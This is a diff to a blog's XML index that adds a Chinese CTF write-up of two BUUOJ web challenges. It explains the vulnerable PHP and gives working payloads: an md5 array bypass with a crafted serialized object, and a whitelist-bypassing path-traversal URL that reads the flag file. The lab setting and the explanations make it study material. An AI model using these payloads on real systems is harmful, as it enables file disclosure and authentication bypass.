@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>BUUweb笔记</title>
+      <link href="/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/"/>
+      <url>/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<p>BUU的做题笔记</p><h2 id="BUU-CODE-REVIEW-11传送门"><a href="#BUU-CODE-REVIEW-11传送门" class="headerlink" title="BUU CODE REVIEW 11传送门"></a>BUU CODE REVIEW 11<a href="https://buuoj.cn/challenges#BUU%20CODE%20REVIEW%201" target="_blank" rel="noopener">传送门</a></h2><p><img src="https://cdn.sijiu.ren/blog/20210317/10do5cxYd1Oz.png?imageslim" alt="mark"></p><p>审计代码可以发现想要得到flag必须满足</p><p>1.pleaseget等于1</p><p>2.pleasepost等于2</p><p>3.md51和md52的md5值相等且md51和md52的值不相等</p><p>4.反序列化obj</p><p>payload</p><pre><code>pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</code></pre><p><img src="https://cdn.sijiu.ren/blog/20210317/8iIQ4dsta4yl.png?imageslim" alt="mark"></p><p>序列化构造方法</p><p><img src="https://cdn.sijiu.ren/blog/20210317/qoSXaVobPpNb.png?imageslim" alt="mark"></p><h2 id="HCTF-2018-WarmUp1-传送门"><a href="#HCTF-2018-WarmUp1-传送门" class="headerlink" title="[HCTF 2018]WarmUp1 传送门"></a>[HCTF 2018]WarmUp1 <a href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp" target="_blank" rel="noopener">传送门</a></h2><p>查看页面源代码</p><p><img src="https://cdn.sijiu.ren/blog/20210317/4TB8EL2NzUSl.png?imageslim" alt="mark"></p><p>访问source.php</p><p><img src="https://cdn.sijiu.ren/blog/20210317/Q7krkxpQt722.png?imageslim" alt></p><p><img src="https://cdn.sijiu.ren/blog/20210317/0g9lh2e5eCM9.png?imageslim" alt></p><p>查看源码</p><pre><code>! empty //要求变量不为空is_string  //要求传参的数值为字符型的emmm::checkFile //将传递进来的值传到emmm这个类的checkFile这个函数里</code></pre><p>总结就是传参进来的file为字符型就引用这个数值的文件否则就是执行图片代码</p><p>接下来看emmm类里的checkFile函数</p><pre><code>! isset //要求传递的变量存在!is_string //要求为字符串in_array($page, $whitelist) //要求传递进来的值与$whitelist的值匹配mb_substr($page,0,mb_strpos($page . &#39;?&#39;, &#39;?&#39;)) //取传递进来的值的第一位开始到出现?结束如果没?则全部</code></pre><p>可以看到$whitelist的值只有source.php和hint.php</p><p>访问</p><pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/source.php/?file=hint.php</code></pre><p>得到提示</p><p><img src="https://cdn.sijiu.ren/blog/20210317/WnP6YJJMPaRY.png?imageslim" alt="mark"></p><p>flag在ffffllllaaaagggg里面</p><p>构造获取flag的语句</p><p>payload </p><pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><p><img src="https://cdn.sijiu.ren/blog/20210317/5N3CLF6OeAnK.png?imageslim" alt="mark"></p><p>虽然在checkFile函数中对file的值进行了一系列处理，但是并没有影响到file真正的值，因为在使用处理后的file进行白名单匹配的时候，都是使用了一个新的变量接受file的值，而并没有直接影响file本来的值，所以file的值依旧为</p><pre><code>file=hint.php?../../../../../ffffllllaaaagggg</code></pre>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Mac泛洪攻击与监听</title>
       <link href="/2021/03/16/Mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E4%B8%8E%E7%9B%91%E5%90%AC/"/>
       <url>/2021/03/16/Mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E4%B8%8E%E7%9B%91%E5%90%AC/</url>
